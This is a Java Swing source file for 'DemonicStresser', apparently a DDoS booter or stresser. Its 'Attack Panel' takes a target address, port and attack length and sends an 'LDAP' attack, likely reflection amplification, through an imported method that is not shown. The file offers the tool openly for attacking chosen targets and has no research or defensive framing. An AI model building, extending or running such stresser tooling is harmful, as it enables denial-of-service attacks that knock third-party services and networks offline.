package org.thesecretintelligence.demonic.stresser;

import java.awt.Color;
import java.awt.EventQueue;
import java.awt.Font;
import java.io.IOException;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JMenuBar;
import javax.swing.JTextField;

import org.thesecretintelligence.demonic.stresser.attack.methods.LDAP;
import org.thesecretintelligence.demonic.utils.Utils;
import org.thesecretintelligence.demonic.verify.Verify;

import javax.swing.JSeparator;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

public class Stresser {

	private JFrame frame;
	private JTextField txtAttackMethod;

	/**
	 * Launch the application.
	 */
	public static void main() {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					Stresser window = new Stresser();
					window.frame.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/**
	 * Create the application.
	 */
	public Stresser() {
		initialize();
	}
	private static Verify verify = new Verify();
	Font title = new Font("Trebuchet MS", Font.BOLD, 20);
	Font footer = new Font("Trebuchet MS", Font.BOLD, 10);
	Font font = new Font("Arial", Font.BOLD, 13);
	private JLabel lblDemonStresser;
	private JSeparator separator;
	private JTextField txtAttackLengthHere;
	private JLabel lblTargetAddress;
	private JTextField textField;
	private JLabel lblTargetPort;
	private JTextField textField_1;
	private JLabel lblC;

	/**
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frame = new JFrame();
		frame.setTitle("DemonicStresser - Version 1.0-Beta");
		frame.setBounds(100, 100, 800, 600);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.getContentPane().setLayout(null);
		ImageIcon icon1 = new ImageIcon(this.getClass().getResource("/icon.png"));
		frame.setResizable(false);
		frame.setIconImage(icon1.getImage());
		try {
			frame.setContentPane(new JLabel(new ImageIcon(ImageIO.read(this.getClass().getResource("/bg-ds-m.png")))));
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		txtAttackMethod = new JTextField();
		txtAttackMethod.setText("Attack Method Here");
		txtAttackMethod.setBounds(123, 101, 138, 20);
		frame.getContentPane().add(txtAttackMethod);
		txtAttackMethod.setColumns(10);
		
		JLabel lblPleaseEnterA = new JLabel("Attack Method ->");
		lblPleaseEnterA.setFont(font);
		lblPleaseEnterA.setForeground(Color.BLACK);
		lblPleaseEnterA.setBounds(10, 103, 126, 14);
		frame.getContentPane().add(lblPleaseEnterA);
		
		lblDemonStresser = new JLabel("Demonic Stresser - Attack Panel");
		lblDemonStresser.setForeground(Color.BLACK);
		lblDemonStresser.setBounds(231, 11, 354, 44);
		lblDemonStresser.setFont(title);
		frame.getContentPane().add(lblDemonStresser);
		
		separator = new JSeparator();
		separator.setBounds(123, 66, 535, 20);
		frame.getContentPane().add(separator);
		
		JLabel lblAttackLength = new JLabel("Attack Length ->");
		lblAttackLength.setBounds(10, 151, 107, 14);
		lblAttackLength.setForeground(Color.BLACK);
		lblAttackLength.setFont(font);
		frame.getContentPane().add(lblAttackLength);
		
		txtAttackLengthHere = new JTextField();
		txtAttackLengthHere.setText("Attack Length Here");
		txtAttackLengthHere.setBounds(123, 148, 138, 20);
		frame.getContentPane().add(txtAttackLengthHere);
		txtAttackLengthHere.setColumns(10);
		
		lblTargetAddress = new JLabel("Target Address ->");
		lblTargetAddress.setFont(font);
		lblTargetAddress.setForeground(Color.BLACK);
		lblTargetAddress.setBounds(10, 198, 126, 14);
		frame.getContentPane().add(lblTargetAddress);
		
		textField = new JTextField();
		textField.setText("Target Address Here");
		textField.setBounds(123, 196, 138, 20);
		frame.getContentPane().add(textField);
		textField.setColumns(10);
		
		lblTargetPort = new JLabel("Target Port ->");
		lblTargetPort.setFont(font);
		lblTargetPort.setForeground(Color.BLACK);
		lblTargetPort.setBounds(10, 243, 107, 14);
		frame.getContentPane().add(lblTargetPort);
		
		textField_1 = new JTextField();
		textField_1.setText("Target Port Here");
		textField_1.setBounds(123, 241, 138, 20);
		frame.getContentPane().add(textField_1);
		textField_1.setColumns(10);
		
		JButton btnSendAttack = new JButton("Send Attack");
		btnSendAttack.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				int x;
				if(txtAttackMethod.getText().equalsIgnoreCase("LDAP")) {
					
					try {
						x = Integer.parseInt(txtAttackLengthHere.getText());
					}catch (NumberFormatException e) {
						Utils.alert("Incorrect Attack Length!", "You cannot have any letters or special characters in the attack length!", "error");
						return;
					}
					
					if(x > 800) {
						Utils.alert("Incorrect Attack Length!", "You are not allowed to exceed a attack length of 800!", "error");
						return;
					}
					System.out.println(textField.getText() + textField_1.getText() + x);
					if(LDAP.sendAttack(textField.getText(), textField_1.getText(), x)) {
						Utils.alert("Sent Attack!", "A LDAP Attack has been sent to " + textField.getText() + "!", "info");
					}else {
						Utils.alert("Failed Attack!", "A LDAP Attack has failed to be sent to " + textField.getText() + "!", "error");
					}
					
					
				}else {
					Utils.alert("Incorrect Attack Method!", "Please Only Use These Attack Methods - LDAP - MORE ATTACK METHODS COMING SOON!", "error");
				}
				
			}
		});
		btnSendAttack.setBounds(51, 277, 126, 23);
		frame.getContentPane().add(btnSendAttack);
		
		lblC = new JLabel("Current ID - " + verify.getId());
		lblC.setBounds(10, 536, 535, 14);
		lblC.setForeground(Color.BLACK);
		lblC.setFont(footer);
		frame.getContentPane().add(lblC);
		
		JButton btnRefreshPanel = new JButton("Refresh Panel");
		btnRefreshPanel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				lblC = new JLabel("Current ID - " + verify.getId());
				lblC.setBounds(10, 536, 535, 14);
				lblC.setForeground(Color.BLACK);
				lblC.setFont(footer);
				frame.getContentPane().add(lblC);
				frame.repaint();
			}
		});
		btnRefreshPanel.setBounds(639, 100, 133, 23);
		frame.getContentPane().add(btnRefreshPanel);
	}
}
